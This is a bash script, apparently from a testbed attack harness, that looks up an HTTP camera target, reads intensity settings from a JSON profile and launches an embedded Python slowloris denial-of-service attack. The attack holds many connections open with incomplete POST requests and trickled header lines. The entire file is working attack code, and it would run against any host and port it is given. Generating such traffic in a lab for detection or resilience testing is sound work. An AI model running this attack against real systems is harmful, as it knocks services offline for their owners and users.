#!/usr/bin/env bash
set -o pipefail
BASE="$(cd "$(dirname "$0")/../.." && pwd)"
source "$BASE/scripts/lib/log.sh"

LEVEL="${1:-low}"
KEY="httpcam_slowloris"
ROLE="companion"; SERVICE="http_cam"

TJSON="$(python3 "$BASE/modules/attacks/resolve_target.py" "$BASE/modules/attacks/targets/targets.yml" "$ROLE" "$SERVICE")"
HOST="$(echo "$TJSON" | jq -r .ip)"
PORT="$(echo "$TJSON" | jq -r .port)"

PROFILE="$BASE/modules/attacks/lpc_profiles/attacks_lpc.json"
CONN=$(jq -r ".attacks[\"${KEY}\"].levels[\"${LEVEL}\"].connections" "$PROFILE")
INTERVAL=$(jq -r ".attacks[\"${KEY}\"].levels[\"${LEVEL}\"].interval_s" "$PROFILE")
DUR=$(jq -r ".attacks[\"${KEY}\"].levels[\"${LEVEL}\"].duration_s" "$PROFILE")

bus_attack_start "key=${KEY} level=${LEVEL} role=${ROLE} host=${HOST} port=${PORT}"

PY=$(cat <<'PYCODE'
import socket,sys,time,random
host=sys.argv[1]; port=int(sys.argv[2]); conns=int(sys.argv[3]); interval=float(sys.argv[4]); dur=float(sys.argv[5])
socks=[]
for _ in range(conns):
    try:
        s=socket.socket(); s.settimeout(3); s.connect((host,port))
        s.sendall(b"POST / HTTP/1.1\r\nHost: "+host.encode()+b"\r\nContent-Length: 1000000\r\n")
        socks.append(s)
    except: pass
end=time.time()+dur
while time.time()<end:
    for s in socks:
        try: s.sendall(b"X-a:"+bytes([random.randint(65,90)])+b"\r\n")
        except: pass
    time.sleep(interval)
for s in socks:
    try: s.close()
    except: pass
PYCODE
)
python3 - <<PYCODE "$HOST" "$PORT" "$CONN" "$INTERVAL" "$DUR"
$PY
PYCODE

bus_attack_end "key=${KEY} level=${LEVEL} role=${ROLE}"
